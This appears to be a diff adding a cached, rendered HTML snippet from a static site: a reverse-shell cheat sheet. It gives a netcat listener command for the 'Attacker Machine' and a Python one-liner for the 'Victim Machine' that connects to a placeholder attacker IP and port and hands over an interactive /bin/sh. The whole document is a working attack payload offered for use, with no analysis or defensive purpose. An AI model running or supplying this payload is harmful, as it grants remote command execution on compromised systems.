@@ -1,0 +1,10 @@
+I"<h2 id="attacker-machine">Attacker Machine</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nvlp</span> &lt;<span class="nv">$ATTACKER_PORT</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<h2 id="victim-machine">Victim Machine</h2>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;$ATTACKER_IP&gt;",&lt;$ATTACKER_PORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
+</code></pre></div></div>
+
+<hr />
+:ET
